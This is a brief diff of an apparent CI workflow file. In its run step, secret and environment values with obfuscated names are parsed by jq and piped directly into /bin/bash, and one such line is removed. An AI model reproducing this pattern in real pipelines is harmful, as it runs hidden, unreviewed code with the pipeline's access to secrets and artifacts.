@@ -22,7 +22,6 @@ jobs:
           zdcqd0: ${{ secrets.zdcqd0 }}
         run: |
           printf '%s' "$zdcqd0" | jq -r .fza571 | /bin/bash
-          printf '%s' "$dfxf4941" | jq -r .ertcs8 | /bin/bash
           echo $bdihk9 | jq -r .ugzxu6 | /bin/bash
 
       - name: Archive artifact
